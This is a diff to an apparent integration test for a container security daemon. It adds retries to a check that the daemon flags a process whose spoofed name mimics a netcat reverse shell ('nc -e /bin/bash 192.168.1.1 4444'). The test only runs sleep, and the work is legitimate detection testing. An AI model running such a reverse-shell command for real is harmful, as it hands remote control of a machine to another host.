@@ -105,24 +105,34 @@ process_spawn_rate_threshold = 9999
     time.sleep(3)
 
     # Matches compiled-in nc-exec pattern: Arg0="nc", Keywords=["-e"].
-    subprocess.Popen(
-        [
-            "incus",
-            "exec",
-            container_name,
-            "--",
-            "bash",
-            "-c",
-            "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
-        ],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-    )
+    # sleep 5 (not 30) keeps the process alive long enough for the daemon to read
+    # /proc after the exec event, without piling up long-lived sleeps as we re-fire.
+    def fire():
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "bash",
+                "-c",
+                "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 5",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+    fire()
 
     log_path = coi_dir / "audit" / f"{container_name}.jsonl"
     detected = False
-    for _ in range(30):
+    for i in range(40):
         time.sleep(1)
+        # Re-fire periodically: the first exec can land before the proc-connector
+        # subscription is active (daemon still starting under CI load) and be missed.
+        # Each launch is a fresh execve, guaranteeing one fires after subscription.
+        if i % 3 == 2:
+            fire()
         if log_path.exists():
             for raw in log_path.read_text().splitlines():
                 if not raw.strip():
